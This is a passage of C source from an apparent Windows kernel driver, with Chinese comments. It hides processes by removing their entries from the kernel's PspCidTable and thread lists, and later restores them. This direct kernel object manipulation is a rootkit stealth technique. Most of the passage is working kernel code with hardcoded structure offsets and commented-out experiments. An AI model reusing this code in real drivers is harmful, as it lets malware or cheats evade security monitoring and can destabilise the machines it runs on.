	gWorkInfo.hPID = hPID;



	HideHandleWorker(&gWorkInfo);



	//KeInitializeEvent(&gWorkInfo.Notify, SynchronizationEvent, FALSE);
	//
	//ExInitializeWorkItem(&gWorkInfo.Worker, HideHandleWorker, &gWorkInfo);

	//ExQueueWorkItem(&gWorkInfo.Worker, CriticalWorkQueue);

	//KeWaitForSingleObject(
	//	&gWorkInfo.Notify,
	//	Executive,
	//	KernelMode,
	//	FALSE,
	//	NULL);




	



	//IoAllocateWorkItem()




	return STATUS_SUCCESS;

}

NTSTATUS wRemoveProcessFromPspCidTable(HANDLE hPID)
{
	__try
	{

		if (hExplorer == 0)
		{
			getExplorerPID();
		}

		if (hExplorer == 0)
		{
			LOG_DEBUG("can't find hExplorer errpr\n");
			return STATUS_NOT_SUPPORTED;
		}

		PEPROCESS eprocess = 0;
		if (!NT_SUCCESS(PsLookupProcessByProcessId(hPID, &eprocess)))
		{
			LOG_DEBUG("ERROR wRemovePspCidTable eprocess errpr\n");
			return STATUS_NOT_SUPPORTED;
		}

		KPROCESS gKprocess;
		RtlCopyMemory(&gKprocess, eprocess, sizeof(KPROCESS));
		ObDereferenceObject(eprocess);

		LOG_DEBUG("PspCidTable  : <%p>\n", PspCidTable);

		TABLE_HANDLE_INFO hInfo = { 0 };

		hInfo.hID = hPID;
		hInfo.Object = eprocess;

		if (!_RemoveFromTable(hPID, &hInfo))
		{
			LOG_DEBUG("ERROR RemoveFromTable errpr\n");
			return STATUS_NOT_SUPPORTED;
		}

		ULONGLONG eprovv = (LONGLONG)hInfo.TableEntry.Object >> 16 & 0xFFFFFFFFFFFFFFF0ui64;
		LOG_DEBUG("wExMapHandleToPointer  retu null <%p>\n", eprovv);

		wAddEntryProcessAvl(&hInfo);

		PTABLE_HANDLE_INFO pGr = wGetEntryProcessAvl(&hInfo);
		if (pGr != 0)
		{
			InitializeListHead(&pGr->Link);
			KeInitializeSpinLock(&pGr->Lock);
		}


	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		LOG_DEBUG(" code EXCEPTION %08X\n", GetExceptionCode());
		return STATUS_ACCESS_DENIED;
	}
	return STATUS_SUCCESS;



//	return STATUS_SUCCESS;
}

void wRecoveryThread(HANDLE hThread, HANDLE hProcess, TABLE_HANDLE_INFO* pTable, TABLE_HANDLE_INFO* pProcessTable, BOOLEAN rBuild);

NTSTATUS wRecoveryidTableProcess(HANDLE hPID)
{
	if (PspCidTable == 0)
	{
		return STATUS_NOT_SUPPORTED;
	}
	TABLE_HANDLE_INFO hInfo = {0};
	hInfo.hID = hPID;
	HANDLE hProcess = 0;
	__try{

		do 
		{
			PTABLE_HANDLE_INFO pTableProcess = wGetEntryProcessAvl(&hInfo);
			if (pTableProcess == 0)
			{
				LOG_DEBUG("No wGetEntryProcessAvl ID:%d\n", hProcess);
				break;
			}
			//-------------  首先 我们要恢复进程Table
			hProcess = pTableProcess->hID;


			//if (pTable->pCidTable->Object != 0)
			//{
			//	LOG_DEBUG("No pTable->pCidTable->Object ID:<%p>\n", pTable->pCidTable->Object);
			//}
			//pTable->pCidTable->Object = pTable->Object;


			PEPROCESS eprocess = 0;
			PsLookupProcessByProcessId(pTableProcess->hID, &eprocess);
			if (eprocess != 0)
			{
				ObDereferenceObject(eprocess);
				//if (eprocess == pTable->Object)
				//{
				LOG_DEBUG(" wWhile Create Process %d\n", pTableProcess->hID);

				if (eprocess == pTableProcess->Object)
				{
					LOG_DEBUG("uEz\n");
				}
				else
				{
					LOG_DEBUG("uGz\n");
					eprocess = 0;
				}
				
				//	PHANDLE_TABLE_ENTRY pTableV = wExMapHandleToPointer(*((ULONGLONG*)PspCidTable), (HANDLE)pTable->hID);
				//	if (pTableV != 0)
				//	{
				//		NTSTATUS status = wExDestoryTable(*((ULONGLONG*)PspCidTable), pTable->hID, pTableV);
				//		LOG_DEBUG(" wExDestoryTable Return:%08X\n", status);
				//	}
				//}
			}
			// 没有HANDLE 我们要恢复一下

			if (eprocess == 0)
			{
				HANDLE hCurPID = ExCreateHandle( (PHANDLE_TABLE) *((ULONGLONG*)PspCidTable), &pTableProcess->TableEntry);
				if (hCurPID != (HANDLE) - 1) {
					__try {

						*(DWORD64*)((DWORD64)pTableProcess->Object + (g_offset - 1) * 8) = (DWORD64)hCurPID;
						hProcess = hCurPID;
						LOG_DEBUG("Recovery Process ID:%d   newID:%d\n", hPID, hCurPID);
					}
					__except (1) {
						LOG_DEBUG("except ID:%d\n", hPID);
					}
				}
			}
			


			// TABLE_LINK_GET_FIRST
			BOOLEAN rBuild = TRUE;
			do
			{
				TABLE_HANDLE_INFO* pTableThread = wTableLink(TABLE_LINK_GET_FIRST, pTableProcess, NULL);
				if (pTableThread == 0)
				{
					break;
				}
				wRecoveryThread(pTableThread->hID, hProcess, pTableThread, pTableProcess, rBuild);
				if (rBuild == TRUE)
				{
					rBuild = FALSE;
				}

				wTableLink(TABLE_LINK_DEL, pTableProcess, pTableThread);
				ExFreePoolWithTag(pTableThread, 'tag');
			} while (1);

			


			////恢复线程
			//LIST_ENTRY* wBegin = &pTableProcess->Link;
			//LIST_ENTRY* wEntry = wBegin->Flink;
			////ULONGLONG offsetBegin = ((ULONGLONG)(&hInfo.Link)) - ((ULONGLONG)(&hInfo));
			//while (wBegin != wEntry)
			//{
			//	TABLE_HANDLE_INFO* wInfo = (ULONGLONG) ((DWORD64)wEntry - 8);
			//	wRecoveryThread(wInfo->hID, hProcess, wInfo, pTableProcess);
			//	//if (pTableProcess->MainThead != wInfo->hID)
			//	//{


			//	//}
			//	wTableLink(TABLE_LINK_DEL, pTableProcess, wInfo);
			//	ExFreePoolWithTag(wInfo, 'tag');
			//	wEntry = wBegin->Flink;
			//}



		} while (0);
	}
	__except (1) {

		LOG_DEBUG("__except wAddPspCidTableProcess %d\n", __LINE__);
	}
	return STATUS_NOT_SUPPORTED;
}


extern KSPIN_LOCK PsLoadedModuleSpinLock;


// 该属性只恢复一个线程




void wRecoveryThread(HANDLE hThread , HANDLE hProcess, TABLE_HANDLE_INFO * pTable, TABLE_HANDLE_INFO* pProcessTable,BOOLEAN rBuild) {
	
	KeEnterCriticalRegion();
	ExAcquireSpinLockAtDpcLevel(&SpinLock_RecoveryThread);
	// 先恢复ID
	PETHREAD EThread = pTable->Object;
	CLIENT_ID* pID = (CLIENT_ID*)((ULONGLONG)EThread + offsetCLIENT_ID);
	pID->UniqueProcess = hProcess;
	// 查看ID 是否被移除  移除了 就创建加回去
	// 

	if (PsGetCurrentThread() == EThread)
	{
		LOG_DEBUG("Recovery ------------------self------------- Thread S:%d\n", hThread);
	}
	else
	{
		LOG_DEBUG("Recovery ------------------------------- Thread S:%d\n", hThread);
	}
	

	


	// -------------------  恢复Table

	//PETHREAD LETHREAD = 0;
	//PsLookupThreadByThreadId(hThread, &LETHREAD);
	//if (LETHREAD != 0)
	//{
	//	LOG_DEBUG("Recovery PsLookupThreadByThreadId Sucess:%d\n", hThread);
	//	ObDereferenceObject(LETHREAD);
	//	
	//	if (LETHREAD != pTable->Object)
	//	{
	//		LETHREAD = 0;
	//	}

	//}

	//if (LETHREAD == 0)
	//{
	//	HANDLE_TABLE_ENTRY hTable = { 0 };
	//	hTable.Object = pTable->Object;
	//	HANDLE hNew = ExCreateHandle(*((ULONGLONG*)PspCidTable), pTable->Object);
	//	LOG_DEBUG("newA ID:%d\n", hNew);
	//	if (hNew != -1) {
	//		//LOG_DEBUG("new ID:%d\n", hCurPID);
	//		//HANDLE_TABLE_ENTRY* nEntry = wExMapHandleToPointer(*((ULONGLONG*)PspCidTable), hNew);
	//		//RtlCopyMemory(nEntry, &pTable->TableEntry, 8); // 只能拷贝前面的字节
	//		pID->UniqueThread = hNew;
	//		LOG_DEBUG("recovery Thread new Handle:%d\n", hNew);
	//		// *(DWORD64*)((DWORD64)eprocess + (g_offset - 1) * 8) = hPID;
	//	}
	//}

	//pTable->pCidTable->Object = pTable->TableEntry.Object;
	//LOG_DEBUG(" Recove Table <%p> \n", pTable->pCidTable);

	//// 恢复Process
	//KAPC_STATE* pApcState = ((ULONGLONG)EThread + OffsetApcState);
	////PEPROCESS Process4 = *(PEPROCESS*)((ULONGLONG)EThread + offsetProcess);
	////pApcState->Process = Process4;
	////(*(ULONGLONG*)((ULONGLONG)Process4 + offsetEprocess_ThreadList + sizeof(LIST_ENTRY)))++;
	//*(PEPROCESS*)((ULONGLONG)EThread + offsetProcess) = pApcState->Process;




	//LOG_DEBUG("recovery Thread  Process:<%p>\n", pApcState->Process);



	

	// 把线程插入原来的地方
	// 先插入 EPROCESS 处
		// 再插入 _kprocess

	//if (HIDE_THREAD)
	//{
		PLIST_ENTRY pEntryThread = (PLIST_ENTRY)((ULONGLONG)pProcessTable->Object + 0x30);

		//InitializeListHead(pEntryThread);
		//InitializeListHead((ULONGLONG)EThread + 0x2F8);

		//if (!ThreadIsAdd(EThread, pEntryThread, 0x2F8))
		//{
		//	if (pTable->hID == pProcessTable->MainThead)
		//	{
		//		InsertHeadList(pEntryThread, (ULONGLONG)EThread + 0x2F8);
		//		LOG_DEBUG("recovery HEAD ListEntry KPROCESS\n");
		//	}
		//	else
		//	{
		//		InsertTailList(pEntryThread, (ULONGLONG)EThread + 0x2F8);
		//		LOG_DEBUG("recovery  NoMain ListEntry KPROCESS\n");
		//	}
		//}
		


		
		pEntryThread =  (PLIST_ENTRY)((ULONGLONG)pProcessTable->Object + offsetEprocess_ThreadList);
		InitializeListHead((PLIST_ENTRY)((ULONGLONG)EThread + offsetEthread_ThreadList));
		if (rBuild)
		{
			InitializeListHead(pEntryThread);
		}
		if (pTable->hID == pProcessTable->MainThead)
		{
			InsertHeadList(pEntryThread,  (PLIST_ENTRY)((ULONGLONG)EThread + offsetEthread_ThreadList));
			LOG_DEBUG("recovery HEAD ListEntry  EPROCESS\n");

		}
		else
		{
			InsertTailList(pEntryThread, (PLIST_ENTRY)((ULONGLONG)EThread + offsetEthread_ThreadList));
			LOG_DEBUG("recovery  NoMain ListEntry  EPROCESS\n");
		}



		//if (!ThreadIsAdd(EThread, pEntryThread, offsetEthread_ThreadList)) {

		//}
	//}
	
	RecoveryThreadList(pTable->Object, TRUE);
	LOG_DEBUG("recovery  Thread End\n");

	ExReleaseSpinLockFromDpcLevel(&SpinLock_RecoveryThread);
	// 恢复完成之后 记得断开链接
	KeLeaveCriticalRegion();
}

//  进程不销毁的情况下
NTSTATUS wRecoveryidTableThread(HANDLE hProcess , HANDLE hThread)
{
	if (PspCidTable == 0 )
	{
		return STATUS_NOT_SUPPORTED;
	}
	TABLE_HANDLE_INFO hInfo = { 0 };
	hInfo.hID = hProcess;
	//LOG_DEBUG("wfindEntryThreadAvl 0 ID:%d\n", hProcess);
	__try {
		do 
		{
			//if (!wfindEntryProcessAvl(&hInfo))
			//{
			//	LOG_DEBUG("No findEntryProcessAvl ID:%d\n", hProcess);
			//	break;
			//}

			PTABLE_HANDLE_INFO pTableProcess = wGetEntryProcessAvl(&hInfo);
			if (pTableProcess == 0)
			{
				LOG_DEBUG("No wGetEntryProcessAvl ID:%d\n", hProcess);
				break;
			}

			if (pTableProcess->MainThead == hThread)
			{

				LOG_DEBUG("recovery Main Thread %d\n", pTableProcess->hID);
				wRecoveryidTableProcess(hProcess);
				if (TruePspTerminateProcess)
				{
					// TruePspTerminateProcess(pTableProcess->Object, PsGetCurrentThread(), 0, 0);
					// LOG_DEBUG("TruePspTerminateProcess %d\n", pTableProcess->hID);
				}
				
			}
			else
			{

				LOG_DEBUG("recovery single Thread %d\n", hThread);
				TABLE_HANDLE_INFO ThreadInfoV = { 0 };
				ThreadInfoV.hID = hThread;
				TABLE_HANDLE_INFO* hThreadInfo = wTableLink(TABLE_LINK_FIND, pTableProcess, &ThreadInfoV);
				if (hThreadInfo != 0){
					wRecoveryThread(hThread, hProcess, hThreadInfo, pTableProcess, TRUE);
					wTableLink(TABLE_LINK_DEL, pTableProcess, hThreadInfo);
					ExFreePoolWithTag(hThreadInfo, 'tag');
				}
				else
				{
					LOG_DEBUG("No ThreadFind ID:%d\n", hThread);
				}
			}
		} while (0);
	}
	__except (1) {

		LOG_DEBUG("__except wAddPspCidTableProcess %d\n",__LINE__);
	}
	return STATUS_SUCCESS;
}

